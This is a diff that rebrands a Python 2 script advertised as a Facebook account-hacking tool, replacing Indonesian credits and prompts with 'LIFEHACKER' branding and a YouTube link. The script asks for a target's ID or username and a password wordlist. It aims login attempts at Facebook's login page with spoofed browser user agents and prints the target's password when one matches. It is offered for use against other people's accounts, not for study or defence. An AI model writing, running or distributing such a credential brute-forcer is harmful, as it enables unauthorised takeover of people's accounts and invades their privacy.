@@ -1,7 +1,7 @@
 #!usr
 # -*- coding: UTF-8 -*-
-# Mod by: MR.K7C8NG
-# team: life of programmer
+# Mod by: LIFEHACKER
+# team: LIFEHACKER DEVELOPER
 
 
 import os
@@ -36,35 +36,35 @@ def runntxt(s):
 def banner():
     os.system('clear')
     print " "
-    runntxt(GL+"              Assalamu'@laikum. ^_^")
-    runntxt(WW+"   ..................  ANDA MENCOBA MENGHUBUNGI")
-    runntxt(WW+"     ....       MR.K7C8NG")
-    runntxt(GL+"                   BODO AMAT CUK")
-    runntxt(GG+"     ..........     MANDI DULU SANA")
-    runntxt(Y+"    ............       DILARANG CO*I")
-    runntxt(GG+"           INGAT COK ")
+    runntxt(GL+"              liferedtv0ficial@gmail.com ^_^")
+    runntxt(WW+"   ..................  lifredtv lifehacker derdle")
+    runntxt(WW+"     ....       LIFE HACKER")
+    runntxt(GL+"                   PLEASE SUPPORT US")
+    runntxt(GG+"     ..........     SUBSCRIBE TO YOUTUBE CHANNEL: https://youtu.be/9BTKWzjHDno")
+    runntxt(Y+"    ............       LIFE HACKER DEV")
+    runntxt(GG+"           BE RESPONSIBLE")
     time.sleep(1.5)
     print GG+"  √=============================================√"
     print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: MR.K7C8NG             |"
-    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
-    print WW+"  |        TEAM : InDoNeSiA CYBER ErRoR SyStEm            |"
-    print Y+"  |             INSTAGRAM: pranata_pasha              |"
+    print WW+"  |            MOD BY: LIFEHACKER               |"
+    print GL+"  |       liferedtv lifehacker derdle           |"
+    print WW+"  |        TEAM : LIFE HACKER DEVELOPER         |"
+    print Y+"   |             FACEBOOK: derdle blanco         |"
     print GL+"  |---------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
+    print GL+"  |        LIFE HACKER DEVELOPER [ L.H.D ]      |"
     print GL+"  |---------------------------------------------|"
     print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
+    print GL+"  |•••••••••   YOUR LIFE MY HACK ^_^   •••••••••|"
     print GG+"  √=============================================√"
 
 banner()
 
-print wd+"         gunakan dengan bijak cok "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
+print wd+"         PASTE USER NAME OR ID HERE "
+print GG+"╭────\033[91m[\033[96m ENTER ID\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
 print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
+print "\033[92m╭────\033[91m[ \033[96mENTER File Wordlist \033[95m( pass.txt ) \033[91;1m]"
 password_list = str(raw_input(GG+"╰────➲\033[93m "))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
@@ -72,11 +72,11 @@ useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/
 
 def pil():
                 print GG+" "
-                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
+                g = str(raw_input("[?] Hack Fb SERVER..\033[93;1m[y/n]: "))
                 if g == 'y' or g == 'Y':
                     os.system('python2 brute.py')
                 elif g == 'n' or g == 'N':
-                    print wd+"Keluar dari program..."
+                    print wd+"RUNNING program..."
                     sys.exit()
                 else:
                     print RR+"Pilih yang bener cuk..."
@@ -85,12 +85,12 @@ def pil():
 def edit_wordlist():
 
         print GG+" "
-        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
+        ed = str(raw_input("[?] Edit wordlist HERE.? \033[96;1m[y/n]: "))
         if ed == 'y' or ed == 'Y':
                 os.system('nano '+password_list)
                 pil()
         elif ed == 'n' or ed == 'N':
-                print wd+"Keluar Dari Program..."
+                print wd+"RUNNING Program..."
                 sys.exit()
 
         else:
@@ -110,7 +110,7 @@ def main():
         runn_noobs()
         life()
         print " "
-        print RR+" wordlist tidak ada yg cocok..."
+        print RR+" wordlist LOADING..."
         print " "
 def iqbalz(iqbalz_password):
   try:
@@ -131,7 +131,7 @@ def iqbalz(iqbalz_password):
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
         	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
         	        print " "
-        	        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
+        	        raw_input(WW+"PRESS ENTER TO HACK AGIAN...")
 			sys.exit(1)
   
   
@@ -160,7 +160,7 @@ def runn_noobs():
       /o`    .:`    `              --    `o/
      -s.     .:`                   --     .s-
      o/     .:`                     --     +o
-    .s-     :.                      `:`    -s`
+    .s-     :.     LIFEHACKER       `:`    -s`
     .s.     :.                      `:`    .s.
     .s-     --                      .:     -s.
      o/     `-.                    `-.     /o
@@ -173,8 +173,8 @@ def runn_noobs():
               `-/+///..````..://+/-`
                   `.-::////::-.` \033[91;1m
 
-                \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m MR.K7C8NG
+                \033[90;1mLIFEHACKER THE FUTURE HACKER\033[91;1m
+             Powered by:\033[97m LIFEHACKER
       """
 
 
@@ -182,8 +182,8 @@ def runn_noobs():
          nuub = open(password_list, 'r')
          nuub = nuub.readlines()
          print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
-         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
+         print wd+" [#] RUNNING Password LOGIN ATTEMPT\033[97;1m:", len(nuub),'password'
+         print wd+" [#] CRACKING PASSWORD PLEASE WAIT\033[97;1m.........."
          print " "
 
 if __name__=='__main__':
